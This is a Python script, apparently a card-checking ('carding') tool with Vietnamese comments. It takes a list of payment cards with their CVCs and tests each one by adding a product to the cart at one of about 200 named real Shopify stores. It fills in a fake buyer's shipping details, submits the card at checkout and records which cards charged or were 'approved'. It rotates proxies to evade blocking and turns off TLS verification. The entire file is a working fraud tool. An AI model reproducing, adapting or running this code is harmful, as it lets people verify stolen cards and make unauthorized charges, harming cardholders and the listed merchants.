import random
import re
import string
import time
import requests
import urllib3
import os

# Vo hieu hoa canh bao SSL de tranh lam phien nguoi dung
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CAU TRUC DU LIEU DIA CHI ---
ADDRESS_POOL = {
    "United States": [
        {"city": "New York", "province": "NY", "zip": "10001", "address1": "125 West 26th St", "phone": "2125551234"},
        {"city": "Los Angeles", "province": "CA", "zip": "90012", "address1": "210 West Temple St", "phone": "2135556789"},
        {"city": "Chicago", "province": "IL", "zip": "60605", "address1": "800 South Clark St", "phone": "3125559012"},
        {"city": "Houston", "province": "TX", "zip": "77002", "address1": "1001 Avenida De Las Americas", "phone": "7135553456"},
        {"city": "Miami", "province": "FL", "zip": "33132", "address1": "401 Biscayne Blvd", "phone": "3055557890"}
    ],
    "Canada": [
        {"city": "Toronto", "province": "ON", "zip": "M5V 2T6", "address1": "290 Bremner Blvd", "phone": "4165551122"},
        {"city": "Vancouver", "province": "BC", "zip": "V6B 1X9", "address1": "401 West Georgia St", "phone": "6045553344"},
        {"city": "Montreal", "province": "QC", "zip": "H3B 4G5", "address1": "1001 Rue du Square", "phone": "5145555566"}
    ],
    "Mexico": [
        {"city": "Mexico City", "province": "DIF", "zip": "06000", "address1": "Av. Paseo de la Reforma 222", "phone": "5555551234"},
        {"city": "Guadalajara", "province": "JAL", "zip": "44100", "address1": "Av. Vallarta 1100", "phone": "3335555678"},
        {"city": "Monterrey", "province": "NLE", "zip": "64000", "address1": "Calle Morelos 101", "phone": "8185559012"}
    ]
}

FIRST_NAMES = ["James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]

# --- DANH SACH STORE LAY SAN ---
PRECACHED_SHOPIFY_STORES = [
    ("http://motive-products-2.myshopify.com", 42890819502169),
    ("https://3e37aa.myshopify.com", 52802061205779),
    ("https://5ce225.myshopify.com", 50712614928690),
    ("https://a1a-liquor-2.myshopify.com", 46288902160553),
    ("https://alicehanov-com.myshopify.com", 42806577987755),
    ("https://alpartyballoons.com", 48259715268850),
    ("https://ancutiecreations.com", 47026035491040),
    ("https://anseladams.org", 51474937217313),
    ("https://anthroverse.myshopify.com", 48228911710431),
    ("https://artpop.com", 47305908453546),
    ("https://artsulli.com", 43871894339626),
    ("https://askunclejack.com", 45304953372954),
    ("https://auric-blends-2.myshopify.com", 29480548958319),
    ("https://avllooms.com", 51163232403759),
    ("https://backpacks-usa-admin.myshopify.com", 46928079618305),
    ("https://backwoodzstudioz.com", 47324633006328),
    ("https://bauerproducts.com", 50654491803864),
    ("https://beataclasp.com", 46889431007491),
    ("https://beauregardstailor.shop", 50844604301590),
    ("https://biologyproducts.com", 40099310141521),
    ("https://blumsalmanac.com", 46389566439652),
    ("https://bodycandy-2.myshopify.com", 42914788180042),
    ("https://brickmini.com", 41967714828324),
    ("https://brybelly.com", 53449597387124),
    ("https://bughunterbug.com", 43926754361520),
    ("https://caffeinacoffee.com", 47599189197027),
    ("https://candyconfusion.ca", 45441356333252),
    ("https://candy-edventure.myshopify.com", 41477576851507),
    ("https://caretolearnsore.myshopify.com", 48895421579572),
    ("https://carlashes.com", 39351449682038),
    ("https://cfr-performance-retail.myshopify.com", 47243952095480),
    ("https://chloesgiantcookies.com", 49659223998766),
    ("https://ciamor.com", 49963047321881),
    ("https://comda-com.myshopify.com", 47713070350491),
    ("https://constructionsticker.com", 47330350006432),
    ("https://cookiesociety.com", 38068482900117),
    ("https://culleys.co.nz", 44900351705274),
    ("https://customamsteelproducts.com", 43709545971941),
    ("https://dare-valore.myshopify.com", 42288584458380),
    ("https://darkroomgrowlabs.com", 49888989905186),
    ("https://dbs838.myshopify.com", 47768590254399),
    ("https://deerbeadsstore.com", 53063469269152),
    ("https://deltacowebstore.com", 39474398822518),
    ("https://desert-noir.myshopify.com", 39551676678306),
    ("https://dev-goodybeads.myshopify.com", 38118442991808),
    ("https://dogfishtacklecompany.com", 47099112620268),
    ("https://dragonpopsocial.com", 45174497509564),
    ("https://drmtlgy.myshopify.com", 39496749678647),
    ("https://dust-dreams-boutique.myshopify.com", 39511288479832),
    ("https://electricwheel-store.myshopify.com", 51542175351060),
    ("https://element-tattoo-supplies.myshopify.com", 47425723531491),
    ("https://embroiderymonkey.com", 52049135927605),
    ("https://enchantedimagaerium.com", 50356293206322),
    ("https://eos-designs-studio.myshopify.com", 40502153969731),
    ("https://erinbakers.myshopify.com", 49146939670809),
    ("https://fbbuch.myshopify.com", 51071876563108),
    ("https://fishandsave.myshopify.com", 52076230017205),
    ("https://fittingandvalve.myshopify.com", 46866823807204),
    ("https://fortworthfabricstudio.myshopify.com", 47219417579738),
    ("https://geekishglitterlacquer.com", 42857165488216),
    ("https://hi5paws.sg", 15635720962097),
    ("https://highlife.ca", 18676882210878),
    ("https://hive-brands.myshopify.com", 43305271361672),
    ("https://holidayshopcloseouts.com", 47029632467167),
    ("https://hookahjohn.com", 21469585479),
    ("https://i55bookfairs.com", 49210471874846),
    ("https://idahoangler.com", 41043742949456),
    ("https://irod.stoprust.com", 47616441155880),
    ("https://islandbookstore.com", 32518622707843),
    ("https://jamielynnhome.myshopify.com", 46697254748309),
    ("https://jeffreycampbell.myshopify.com", 53677617119604),
    ("https://jenteal-soaps.myshopify.com", 44468720140450),
    ("https://jewelry-coin-mart.myshopify.com", 42624618266687),
    ("https://jigglescents.com", 49385969418526),
    ("https://johantwiss.com", 36677023334564),
    ("https://justverticalblinds.com", 47351274504430),
    ("https://karensbodybeautiful.com", 54003242271011),
    ("https://kegco.com", 47080480997625),
    ("https://kingdomcomecards.com", 44784674439368),
    ("https://kitchenkapers.myshopify.com", 45446537543876),
    ("https://leannrimesstore.com", 46370008072367),
    ("https://le-mini-macaron-2.myshopify.com", 41721381290032),
    ("https://lincolncitygifts.com", 50769024155965),
    ("https://linenlark.com", 40234734288999),
    ("https://lisvanscents.myshopify.com", 44802674426092),
    ("https://livestocktags.myshopify.com", 45162295951533),
    ("https://locallatherok.com", 46034453102781),
    ("https://logolaunch.com", 44788223443229),
    ("https://lorecranch.com", 47207861649652),
    ("https://mainegroceries.com", 1549127647276),
    ("https://makeup101.com", 43947999691070),
    ("https://manisfest.com", 45017880002715),
    ("https://mermaidstraw.com", 46616067342505),
    ("https://meta-app-prod-store-1.myshopify.com", 43916356518050),
    ("https://midnightteacandles.myshopify.com", 46258525339883),
    ("https://millerbeesupply.com", 46882851881206),
    ("https://missdealsboutique.com", 62568133132447),
    ("https://momoslimes.com", 42818061860943),
    ("https://mothershipatx.com", 54459323580584),
    ("https://muddycreektags.com", 45186243100724),
    ("https://northgalighting.myshopify.com", 43060196278407),
    ("https://oceanhut.com", 46440845770929),
    ("https://olyvogue.myshopify.com", 46403812098210),
    ("https://opusartsupplies.com", 44110175568103),
    ("https://order.sandttoo.com", 44700222718142),
    ("https://overstockepoxy.com", 43071440847075),
    ("https://pamelanielsen.com", 51534440825111),
    ("https://paperieplanning.com", 47287457415406),
    ("https://park-east-ny.myshopify.com", 47356041986294),
    ("https://patternbyiman.com", 54502795345993),
    ("https://perpetualsupplyco.com", 46738113102056),
    ("https://polarfilament.com", 44965127880899),
    ("https://premiumpartydistribution.com", 51724069634329),
    ("https://primrosecottage.myshopify.com", 52195302277395),
    ("https://printzbyniesha.com", 51325320102162),
    ("https://punisher.myshopify.com", 39541462270015),
    ("https://rays-midbell-music.myshopify.com", 41118495703083),
    ("https://razorcake.myshopify.com", 45038048313523),
    ("https://reddirtbaitcompany.com", 42484172783794),
    ("https://rivercitybaits.online", 44265528033577),
    ("https://rockbottomje.myshopify.com", 42790393675967),
    ("https://sassysaucepolish.com", 39859154583610),
    ("https://savichic.com", 40452888363179),
    ("https://schoolsupplyboxes.com", 31648760823880),
    ("https://scorenn.com", 44969654747290),
    ("https://serramesaflorist.com", 50157639336240),
    ("https://shelf-co.com", 39307976933419),
    ("https://shop4-h.org", 43352560697446),
    ("https://shop.aansw.org.au", 51176886370468),
    ("https://shopcaffeinequeens.com", 44423095484598),
    ("https://shop.iyasumehawaiicom", 46755722363072),
    ("https://shop.juanpollo.com", 44729638846680),
    ("https://shopmiddleeastern.com", 41574708248663),
    ("https://shop-small-shop-handmade-llc-the-shop.myshopify.com", 47719100285150),
    ("https://shop.spam.com", 47274164650139),
    ("https://shop.stokeraces.com", 46685084516587),
    ("https://shop.terrapinbeer.com", 39983144894510),
    ("https://shop.titanicattraction.com", 45930707353849),
    ("https://shop.trektravel.com", 42403904159786),
    ("https://shop.wildatheart.org", 46431883853994),
    ("https://simbihaiti.com", 45562876625121),
    ("https://simplylightdesigns.com", 50873542672664),
    ("https://sladostea.com", 46962585272485),
    ("https://soavefaire.com", 3955794378781),
    ("https://south-coast-baby-co.myshopify.com", 47822417068255),
    ("https://spartanshop.stewardschool.org", 52048684351797),
    ("https://sponsormetapefb.com", 44260435362110),
    ("https://stayhcf-us.myshopify.com", 46208590512348),
    ("https://store.otdefense.com", 46460762423521),
    ("https://store.thetrek.co", 46045658611970),
    ("https://strongcoffeecompany.com", 40819574833237),
    ("https://sustaingrooming.com", 52189527965909),
    ("https://sweetstreamflytying.com", 51455545835733),
    ("https://technogears.tlji.com", 51127247634734),
    ("https://thecatholicgiftstore.com", 51568155689261),
    ("https://thecreepingmoon.store", 48535529554153),
    ("https://thedimelab.com", 47999865782477),
    ("https://thegoodlifestoreyork.com", 42478652883181),
    ("https://theheadnut.com", 39826208948323),
    ("https://theimprint.sg", 52752287760691),
    ("https://thepouchshop.com.au", 13778956058687),
    ("https://the-purple-door-9111.myshopify.com", 50021502320919),
    ("https://thespinsterz.com", 41481940009035),
    ("https://torcousa.com", 42410167304424),
    ("https://ultraviewarchery.com", 53649240719732),
    ("https://valuepetsupplies-com.myshopify.com", 44525131464875),
    ("https://vaporesso-store.myshopify.com", 43875916939455),
    ("https://vegascarts.com", 13940822704172),
    ("https://vv6kxd-np.myshopify.com", 51654412894482),
    ("https://watermanlures.com", 49479326302520),
    ("https://www.allways99pr.com", 47357399859420),
    ("https://www.bettyjanecanies.com", 22811338801252),
    ("https://www.bioseaweedgel.com", 41874636603486),
    ("https://www.bkbeauty.com", 42091263426722),
    ("https://www.electronicsandbatteries.com", 51051031134372),
    ("https://www.funcarnival.com", 48097897087191),
    ("https://www.hookedonpickin.com", 47583170068721),
    ("https://www.indusbasket.com", 36705941717158),
    ("https://www.lavendersbakeshop.com", 39175151887),
    ("https://www.lifeessentialsrefillery.com", 48033630257394),
    ("https://www.localsonlygiftsandgoods.com", 52073644687726),
    ("https://www.mutualhardware.com", 40982170075247),
    ("https://www.oldstatefarms.com", 39558480396377),
    ("https://www.perfectpartyplace.ca", 44533406204080),
    ("https://www.performance-pcs.com", 46866237128919),
    ("https://www.raymondgeddes.com", 47265179959348),
    ("https://www.retrowavist.com", 49297160372470),
    ("https://www.rhodypper.com", 51532469272875),
    ("https://www.roosroast.com", 50900255572286),
    ("https://www.row7seeds.com", 40795317403690),
    ("https://www.shelburnecountrystore.com", 37298760777879),
    ("https://www.teamblonde.com", 45556090700093),
    ("https://www.tenderandtruepet.com", 47917781221677),
    ("https://www.threadcutterz.com", 26464266113),
    ("https://youre-on-the-money.myshopify.com", 33786499399816),
]

def get_random_buyer():
    country = random.choice(list(ADDRESS_POOL.keys()))
    addr = random.choice(ADDRESS_POOL[country])
    rand_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return {
        "email": f"buyer.{rand_id}@gmail.com",
        "first_name": random.choice(FIRST_NAMES),
        "last_name": random.choice(LAST_NAMES),
        "address1": addr["address1"],
        "city": addr["city"],
        "province": addr["province"],
        "country": country,
        "zip": addr["zip"],
        "phone": addr["phone"]
    }

def _apply_proxy(session, proxy):
    if not proxy: return True
    try:
        parts = proxy.split(":")
        if len(parts) == 4:
            p_str = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            p_str = f"http://{parts[0]}:{parts[1]}"
        proxies = {"http": p_str, "https": p_str}
        session.proxies.update(proxies)
        # Kiem tra proxy live hay die
        session.get("https://google.com", timeout=5)
        return True
    except:
        return False

def _normalize_site(site):
    site = site.strip()
    if not site.startswith("http"): site = "https://" + site
    return site.rstrip("/")

def shopify_check(card_data, proxy=None):
    # Phan tach du lieu the
    try:
        parts = card_data.split("|")
        cc = parts[0].replace(" ", "")
        mm = parts[1]
        yy = parts[2]
        if len(yy) == 2: yy = "20" + yy
        cvc = parts[3]
    except:
        return "ERROR: Dinh dang card sai", False

    session = requests.Session()
    session.verify = False
    
    # Ap dung proxy
    if proxy and not _apply_proxy(session, proxy):
        return "PROXY_DIE", False

    try:
        # 1. Chon store va variant
        store_url, variant_id = random.choice(PRECACHED_SHOPIFY_STORES)
        site = _normalize_site(store_url)
        
        # 2. Them vao gio hang
        add_cart = session.post(
            f"{site}/cart/add.js", 
            json={"id": variant_id, "quantity": 1}, 
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=15
        )
        
        # 3. Lay link checkout
        resp_cart = session.get(f"{site}/cart.json", timeout=15)
        cart_data = resp_cart.json()
        token = cart_data.get("token")
        if not token:
            return "ERROR: Khong lay duoc token", False
        
        checkout_url = f"{site}/checkout?cart={token}"
        
        # 4. Truy cap trang checkout de lay authenticity_token
        res_checkout = session.get(checkout_url, timeout=15)
        auth_token = re.search(r'name="authenticity_token" value="([^"]+)"', res_checkout.text)
        auth_token = auth_token.group(1) if auth_token else ""

        # 5. Dien thong tin giao hang
        buyer = get_random_buyer()
        shipping_payload = {
            "_method": "patch",
            "previous_step": "contact_information",
            "step": "shipping_method",
            "authenticity_token": auth_token,
            "checkout[email]": buyer["email"],
            "checkout[shipping_address][first_name]": buyer["first_name"],
            "checkout[shipping_address][last_name]": buyer["last_name"],
            "checkout[shipping_address][address1]": buyer["address1"],
            "checkout[shipping_address][city]": buyer["city"],
            "checkout[shipping_address][country]": buyer["country"],
            "checkout[shipping_address][province]": buyer["province"],
            "checkout[shipping_address][zip]": buyer["zip"],
            "checkout[shipping_address][phone]": buyer["phone"],
        }
        session.post(checkout_url, data=shipping_payload, timeout=15)

        # 6. Gui thanh toan
        payment_payload = {
            "_method": "patch",
            "previous_step": "shipping_method",
            "step": "payment_method",
            "authenticity_token": auth_token,
            "checkout[payment_method][type]": "credit_card",
            "checkout[payment_method][attributes][number]": cc,
            "checkout[payment_method][attributes][month]": mm,
            "checkout[payment_method][attributes][year]": yy,
            "checkout[payment_method][attributes][verification_value]": cvc,
            "checkout[payment_method][attributes][first_name]": buyer["first_name"],
            "checkout[payment_method][attributes][last_name]": buyer["last_name"],
        }
        
        final_res = session.post(checkout_url, data=payment_payload, timeout=20)
        res_text = final_res.text.lower()

        # 7. Phan loai ket qua
        if any(k in res_text for k in ["thank you", "confirmed", "success", "orders"]):
            return "CHARGED", True
        elif any(k in res_text for k in ["insufficient", "declined", "error"]):
            if "insufficient" in res_text:
                return "APPROVED", True
            return "DECLINED", False
        else:
            return "UNKNOWN RESPONSE", False

    except Exception as e:
        return f"ERROR: {str(e)[:50]}", False

def main():
    print("--- SHOPIFY CHECKER ---")
    file_data = input("nhap file data (.txt): ")
    if not os.path.exists(file_data):
        print("File data khong ton tai")
        return

    file_proxy = input("nhap file proxy (ip:port or enter de skip): ")
    proxies = []
    if file_proxy and os.path.exists(file_proxy):
        with open(file_proxy, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]

    with open(file_data, 'r') as f:
        cards = [line.strip() for line in f if line.strip()]

    total = len(cards)
    print(f"Tong so the: {total}")

    proxy_index = 0
    last_proxy_change = time.time()
    current_proxy = proxies[0] if proxies else None

    for i, card in enumerate(cards, 1):
        # Co che xoay proxy moi 2 phut
        if proxies and (time.time() - last_proxy_change > 120):
            proxy_index = (proxy_index + 1) % len(proxies)
            current_proxy = proxies[proxy_index]
            last_proxy_change = time.time()
            print(f"Doi proxy: {current_proxy}")

        print(f"[{i}/{total}] Checking: {card}")
        
        status, is_live = shopify_check(card, current_proxy)

        # Neu proxy chet, thuc hien xoa va doi ngay lap tuc
        if status == "PROXY_DIE" and proxies:
            print(f"Proxy die: {current_proxy}. Dang xoa khoi danh sach...")
            proxies.remove(current_proxy)
            if not proxies:
                print("Het proxy live de tiep tuc")
                current_proxy = None
            else:
                proxy_index %= len(proxies)
                current_proxy = proxies[proxy_index]
            # Thu lai the nay voi proxy moi
            status, is_live = shopify_check(card, current_proxy)

        print(f"Status: {status}")

        # Luu ket qua neu Live
        if is_live:
            with open("live.txt", "a") as f_live:
                f_live.write(f"{card} | {status}\n")

    print("--- HOAN THANH ---")

if __name__ == "__main__":
    main()